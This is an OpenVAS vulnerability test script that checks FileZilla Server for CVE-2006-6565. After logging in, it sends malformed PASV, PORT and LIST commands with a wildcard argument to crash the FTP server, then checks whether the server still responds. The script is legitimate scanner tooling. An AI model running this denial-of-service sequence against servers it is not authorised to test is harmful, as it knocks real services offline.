###################################################################
# OpenVAS Vulnerability Test
# $Id: filezilla_server_port_cmd_dos.nasl 4718 2016-12-08 13:32:01Z cfi $
#
# FileZilla Server Port Command Denial of Service
#
# LSS-NVT-2010-007
#
# Developed by LSS Security Team <http://security.lss.hr>
#
# Copyright (C) 2010 LSS <http://www.lss.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public
# License along with this program. If not, see
# <http://www.gnu.org/licenses/>.
###################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.102019");
  script_version("$Revision: 4718 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-08 14:32:01 +0100 (Thu, 08 Dec 2016) $");
  script_tag(name:"creation_date", value:"2010-04-02 10:10:27 +0200 (Fri, 02 Apr 2010)");
  script_cve_id("CVE-2006-6565");
  script_bugtraq_id(21542, 21549);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_name("FileZilla Server Port Command Denial of Service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 LSS");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/login", "ftp/password");

  tag_solution = "Upgrade vulnerable FTP server to latest version.";

  tag_summary = "FileZilla Server before 0.9.22 allows remote attackers to
  cause a denial of service (crash) via a wildcard argument
  to the (1) LIST or (2) NLST commands, which results in a
  NULL pointer dereference, a different set of vectors than
  CVE-2006-6564.
  NOTE: CVE analysis suggests that the problem might be due
  to a malformed PORT command.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

report = "OpenVAS was able to crash the remote FTP server by sending
a malformed PASV command.";

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if (!user) exit(0);
if (!pass) exit(0);

attack = "A*";

port = get_ftp_port( default:21 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

is_alive = ftp_recv_line(socket:soc);
if(!is_alive)exit(0);

###################
###step 1: login###
###################

cmd = "USER " + user;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "PASS " + pass;
ftp_send_cmd (socket:soc, cmd:cmd);

########################
###step 2: the attack###
########################

cmd = "PASV " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "PORT " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "LIST " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

###############################
###step 3: attack succeeded?###
###############################

close(soc);

sleep(5);

soc1 = open_sock_tcp(port);
is_alive = ftp_recv_line(socket:soc1);

if (!is_alive) {
  security_message(data:report, port:port);
}

#end of exploit, closing open socket

close(soc1);
